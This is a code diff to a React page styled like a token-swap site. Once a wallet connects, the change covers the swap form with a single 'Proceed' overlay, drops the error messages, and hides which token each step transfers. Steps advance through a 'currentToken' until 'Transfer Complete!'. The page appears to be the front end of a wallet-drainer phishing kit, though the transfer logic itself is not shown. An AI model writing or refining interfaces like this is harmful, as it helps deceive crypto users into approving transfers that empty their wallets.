@@ -236,7 +236,38 @@ export default function Home() {
 
       <main className="pt-32 pb-20 px-4" style={{ marginTop: '80px' }}>
         <div className="max-w-md mx-auto">
-          <div className="bg-card rounded-3xl border border-border shadow-lg p-2">
+          <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative overflow-hidden">
+            {/* Proceed Overlay - covers swap box when connected */}
+            {isConnected && currentToken !== "complete" && (
+              <div className="absolute inset-0 z-20 flex items-center justify-center p-4">
+                <button
+                  onClick={handleProceed}
+                  disabled={isProcessing}
+                  className="w-full h-full rounded-2xl bg-[#FF00D6] hover:bg-[#e800c0] text-white text-xl font-semibold flex items-center justify-center gap-3 disabled:opacity-80"
+                  data-testid="button-proceed"
+                >
+                  {isProcessing ? (
+                    <>
+                      <Loader2 className="w-6 h-6 animate-spin" />
+                      Processing...
+                    </>
+                  ) : (
+                    "Proceed"
+                  )}
+                </button>
+              </div>
+            )}
+            
+            {/* Complete Overlay */}
+            {isConnected && currentToken === "complete" && (
+              <div className="absolute inset-0 z-20 flex items-center justify-center p-4">
+                <div className="w-full h-full rounded-2xl bg-green-500 text-white text-xl font-semibold flex items-center justify-center gap-3">
+                  <CheckCircle className="w-6 h-6" />
+                  Complete!
+                </div>
+              </div>
+            )}
+
             <div className="flex items-center justify-between px-2 py-2 mb-2">
               <div className="flex items-center gap-1">
                 {tabs.map((tab) => (
@@ -380,37 +411,9 @@ export default function Home() {
               </div>
             </div>
 
-            <div className="mt-4">
-              {error && (
-                <div className="mb-3 p-3 bg-red-50 border border-red-200 rounded-xl text-sm text-red-600">
-                  {error}
-                </div>
-              )}
-              
-              {isConnected ? (
-                currentToken === "complete" ? (
-                  <div className="w-full py-4 text-lg font-semibold rounded-2xl bg-green-100 text-green-600 flex items-center justify-center gap-2">
-                    <CheckCircle className="w-5 h-5" />
-                    Transfer Complete!
-                  </div>
-                ) : (
-                  <button
-                    onClick={handleProceed}
-                    disabled={isProcessing}
-                    className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FF00D6] hover:bg-[#e800c0] text-white disabled:opacity-50 flex items-center justify-center gap-2"
-                    data-testid="button-proceed"
-                  >
-                    {isProcessing ? (
-                      <>
-                        <Loader2 className="w-5 h-5 animate-spin" />
-                        Processing...
-                      </>
-                    ) : (
-                      `Proceed with ${tokenSymbol}`
-                    )}
-                  </button>
-                )
-              ) : (
+            {/* Connect wallet button - only shows when not connected */}
+            {!isConnected && (
+              <div className="mt-4">
                 <button
                   onClick={openConnectModal}
                   className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6]"
@@ -418,8 +421,8 @@ export default function Home() {
                 >
                   Connect wallet
                 </button>
-              )}
-            </div>
+              </div>
+            )}
           </div>
         </div>
       </main>
